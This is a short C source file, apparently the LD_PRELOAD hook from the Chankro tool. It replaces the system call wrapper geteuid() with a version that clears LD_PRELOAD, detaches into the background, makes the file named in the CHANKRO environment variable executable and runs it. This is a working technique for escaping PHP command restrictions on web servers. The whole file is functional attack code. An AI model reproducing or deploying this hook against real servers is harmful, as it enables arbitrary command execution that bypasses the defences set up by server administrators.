//Ty! n30m1nd 
#define  _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <dlfcn.h>
#include <signal.h>
#include <unistd.h>


void pwn(void) {
	chmod(getenv("CHANKRO"), 00777);
        system(getenv("CHANKRO"));
}

void daemonize(void) {
	signal(SIGHUP, SIG_IGN);
	if (fork() != 0) {
		exit(EXIT_SUCCESS);
	}
}

uid_t geteuid() {
  uid_t (*orig_geteuid)();
  orig_geteuid = dlsym(RTLD_NEXT, "geteuid");
  unsetenv("LD_PRELOAD");
  daemonize();
  pwn();
  return orig_geteuid();
}

